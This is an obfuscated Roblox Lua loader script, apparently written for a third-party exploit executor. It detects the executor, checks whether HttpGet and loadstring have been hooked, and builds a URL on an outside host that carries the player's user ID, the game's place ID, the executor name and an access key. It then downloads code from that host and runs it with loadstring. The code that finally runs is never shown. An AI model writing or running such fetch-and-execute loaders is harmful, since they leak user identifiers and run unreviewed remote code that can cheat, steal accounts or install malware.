local i2d16e4=game:GetService("Players").LocalPlayer
local d90bb,k761e37=pcall(function() return identifyexecutor() end)
local y811=(getgenv and getgenv()) or _G
local s9e59=(y811.CCRAFT_PASS and y811.CCRAFT_PASS["b63558bf"]) or ""
local c9c0c=((pcall(function() return iscclosure(game.HttpGet) and iscclosure(loadstring) end)==true) and "0") or "1"
local j432df="https://api.ccraftspace.dpdns.org/p/b63558bfa14e43fdaa1786b45a7dca47?t=6adfe7dc-8b4aa8f909664b1279ed6745-0-0-0812ebde-5b3e6582f2a10c1a919aab515f47783f&dbg=0&tp="..c9c0c.."&p="..s9e59.."&u="..(i2d16e4 and i2d16e4.UserId or 0).."&g="..game.PlaceId.."&x="..tostring(d90bb and k761e37 or ""):gsub("%W","")
loadstring(game:HttpGet(j432df))()